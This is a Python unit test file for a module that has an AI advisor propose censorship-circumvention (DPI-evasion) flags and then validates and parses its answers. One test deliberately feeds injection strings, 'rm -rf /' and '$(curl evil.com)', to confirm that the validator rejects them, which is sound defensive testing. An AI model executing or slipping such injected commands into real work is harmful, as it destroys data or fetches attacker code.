"""Tests for brain/ai_strategy_engineer.py — parser + flag validation."""

from __future__ import annotations

import sys
import unittest
from pathlib import Path
from unittest.mock import MagicMock

BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

from brain.ai_strategy_engineer import (
    AIStrategyEngineer,
    _build_symptoms,
    _parse_response,
    _validate_flag,
)


class TestValidateFlag(unittest.TestCase):
    def test_known_function_passes(self):
        self.assertTrue(_validate_flag("multisplit:pos=1"))
        self.assertTrue(_validate_flag("multidisorder:pos=1,midsld"))
        self.assertTrue(_validate_flag("fake:blob=fake_default_tls:repeats=4"))
        self.assertTrue(_validate_flag("alpn_strip:strip=h2,h2c"))

    def test_rejects_unknown_function(self):
        self.assertFalse(_validate_flag("rmpacket:pos=1"))
        self.assertFalse(_validate_flag("syndata:something"))

    def test_rejects_shell_injection(self):
        self.assertFalse(_validate_flag("multisplit:pos=1; rm -rf /"))
        self.assertFalse(_validate_flag("$(curl evil.com)"))
        self.assertFalse(_validate_flag("multisplit\ninjected"))

    def test_rejects_empty(self):
        self.assertFalse(_validate_flag(""))
        self.assertFalse(_validate_flag(None))


class TestParseResponse(unittest.TestCase):
    def test_clean_json(self):
        text = '{"flags": ["multisplit:pos=1"], "reasoning": "split early"}'
        out = _parse_response(text)
        self.assertIsNotNone(out)
        self.assertEqual(out.flags, ["multisplit:pos=1"])
        self.assertEqual(out.reasoning, "split early")

    def test_markdown_fenced_json(self):
        text = '```json\n{"flags": ["fake:repeats=4"], "reasoning": "x"}\n```'
        out = _parse_response(text)
        self.assertIsNotNone(out)
        self.assertEqual(out.flags, ["fake:repeats=4"])

    def test_extracts_json_from_chatty_response(self):
        text = (
            "Sure! Here's my recommendation:\n\n"
            '{"flags": ["multidisorder:pos=2,midsld"], "reasoning": "shift split"}'
            "\n\nLet me know if this works!"
        )
        out = _parse_response(text)
        self.assertIsNotNone(out)
        self.assertEqual(out.flags, ["multidisorder:pos=2,midsld"])

    def test_rejects_invalid_flag(self):
        text = '{"flags": ["evilfunc:rm=rf"], "reasoning": "x"}'
        self.assertIsNone(_parse_response(text))

    def test_rejects_empty_flags(self):
        text = '{"flags": [], "reasoning": "x"}'
        self.assertIsNone(_parse_response(text))

    def test_rejects_no_json(self):
        self.assertIsNone(_parse_response("no json here"))
        self.assertIsNone(_parse_response(""))

    def test_truncates_long_reasoning(self):
        text = '{"flags": ["multisplit:pos=1"], "reasoning": "' + "x" * 500 + '"}'
        out = _parse_response(text)
        self.assertEqual(len(out.reasoning), 300)


class TestBuildSymptoms(unittest.TestCase):
    def test_includes_all_fields(self):
        s = _build_symptoms(
            isp="er-telecom",
            block_type="TLS_INTERFERENCE",
            failing_hosts=["discord.com", "cdn.discordapp.com"],
            tried_strategies=[("h2_split568", 0.4), ("nofake_disorder", 0.3)],
            error_pattern="exit=60 SSL on 100% trials",
        )
        self.assertIn("er-telecom", s)
        self.assertIn("TLS_INTERFERENCE", s)
        self.assertIn("discord.com", s)
        self.assertIn("h2_split568", s)
        self.assertIn("exit=60", s)

    def test_caps_tried_to_15(self):
        many = [(f"strat_{i}", 0.1) for i in range(50)]
        s = _build_symptoms("isp", "type", [], many, "")
        # Count strategy lines in tried section
        self.assertEqual(s.count("strat_"), 15)
        # Keeps the LAST 15
        self.assertIn("strat_49", s)
        self.assertNotIn("strat_0:", s)


class TestEngineerEndToEnd(unittest.TestCase):
    """Mock the chat fn — verify the parser + glue logic."""

    def test_returns_none_when_advisor_unavailable(self):
        mock_advisor = MagicMock()
        mock_advisor.is_available.return_value = False
        eng = AIStrategyEngineer(mock_advisor)
        result = eng.request_strategy("isp", "TLS", [], [], "")
        self.assertIsNone(result)

    def test_returns_parsed_strategy_on_good_response(self):
        mock_advisor = MagicMock()
        mock_advisor.is_available.return_value = True
        mock_advisor._chat.return_value = (
            '{"flags": ["multisplit:pos=1:seqovl=8"], "reasoning": "tiny SNI frag"}'
        )
        eng = AIStrategyEngineer(mock_advisor)
        result = eng.request_strategy(
            "er-telecom", "TLS_INTERFERENCE",
            ["discord.com"], [("nofake_disorder", 0.3)], "exit=60 SSL"
        )
        self.assertIsNotNone(result)
        self.assertEqual(result.flags, ["multisplit:pos=1:seqovl=8"])
        self.assertEqual(result.reasoning, "tiny SNI frag")

    def test_returns_none_on_chat_exception(self):
        mock_advisor = MagicMock()
        mock_advisor.is_available.return_value = True
        mock_advisor._chat.side_effect = RuntimeError("rate limited")
        eng = AIStrategyEngineer(mock_advisor)
        result = eng.request_strategy("isp", "TLS", [], [], "")
        self.assertIsNone(result)

    def test_returns_none_on_invalid_response(self):
        mock_advisor = MagicMock()
        mock_advisor.is_available.return_value = True
        mock_advisor._chat.return_value = "I think you should try harder"
        eng = AIStrategyEngineer(mock_advisor)
        result = eng.request_strategy("isp", "TLS", [], [], "")
        self.assertIsNone(result)


if __name__ == "__main__":
    unittest.main()
